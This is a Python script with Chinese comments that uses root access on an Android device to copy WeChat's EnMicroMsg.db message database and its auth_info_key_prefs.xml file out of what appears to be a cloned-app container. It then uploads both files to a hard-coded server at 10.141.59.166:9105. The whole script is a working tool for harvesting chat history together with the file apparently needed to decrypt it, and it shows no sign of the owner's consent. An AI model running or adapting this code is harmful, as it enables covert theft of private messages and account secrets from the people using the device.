import requests
import os
import subprocess
import re
from datetime import datetime

def upload_file(file_path, save_name,folder_name):
    server_ip = "10.141.59.166"
    server_port = 9105
    
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (save_name, f)}
            data = {'folder': folder_name}
            response = requests.post(
                f"http://{server_ip}:{server_port}/upload_wx_file",
                files=files,
                data=data,  # 添加表单字段
                timeout=30
            )
            
        if response.status_code == 200:
            print(f"{save_name} 上传成功到[{folder_name}]目录")
            return True
        else:
            print(f"上传失败: {response.text}")
    except Exception as e:
        print(f"上传错误: {str(e)}")
    return False

def find_enmicromsg_db():
    base_path = "/data/data/top.bienvenido.saas.i18n/app_split/com.tencent.mm/15/MicroMsg"
    temp_path = "/sdcard/ccb/temp.db"
    save_dir = os.path.join(os.getcwd(), "15")
    
    # 创建本地保存目录
    os.makedirs(save_dir, exist_ok=True)
    
    try:
        # 执行查找命令
        cmd = f'su -c "find {base_path} -name EnMicroMsg.db -exec stat -c \\"%Y %n\\" {{}} \\;"'
        result = subprocess.run(
            cmd, 
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode != 0:
            print("查找失败:", result.stderr)
            return None

        files = result.stdout.strip().split('\n')
        if not files[0]:
            print("未找到数据库文件")
            return None

        # 解析最新文件
        latest = max(files, key=lambda x: int(x.split()[0]))
        db_path = latest.split()[1]
        print("找到数据库文件:", db_path)

        # 复制到临时位置
        subprocess.run(f'su -c "cp {db_path} {temp_path}"', shell=True, check=True)
        
        # 保存到本地15目录
        local_path = os.path.join(save_dir, "EnMicroMsg.db")
        if os.path.exists(local_path):
            os.remove(local_path)
        
        subprocess.run(f"cp {temp_path} {local_path}", shell=True, check=True)
        return local_path
        
    except subprocess.CalledProcessError as e:
        print("命令执行失败:", str(e))
    except Exception as e:
        print("操作异常:", str(e))
    finally:
        subprocess.run(f'su -c "rm {temp_path}"', shell=True, stderr=subprocess.DEVNULL)
    
    return None

def process_auth_file():
    src_path = "/data/data/top.bienvenido.saas.i18n/app_split/com.tencent.mm/15/shared_prefs/auth_info_key_prefs.xml"
    save_path = os.path.join(os.getcwd(), "15", "auth_info_key_prefs.xml")
    temp_path = "/sdcard/ccb/temp_auth.xml"
    
    try:
        # 复制文件
        subprocess.run(f'su -c "cp {src_path} {temp_path}"', shell=True, check=True)
        subprocess.run(f"cp {temp_path} {save_path}", shell=True, check=True)
        return save_path
    except Exception as e:
        print("复制授权文件失败:", str(e))
        return None
    finally:
        subprocess.run(f'su -c "rm {temp_path}"', shell=True, stderr=subprocess.DEVNULL)

def main():
    # 处理授权文件
    folder_name = "15" 
    if auth_path := process_auth_file():
        upload_file(auth_path, "auth_info_key_prefs.xml", folder_name)
    
    # 处理数据库文件
    if db_path := find_enmicromsg_db():
        upload_file(db_path, "EnMicroMsg.db", folder_name)

if __name__ == '__main__':
    main()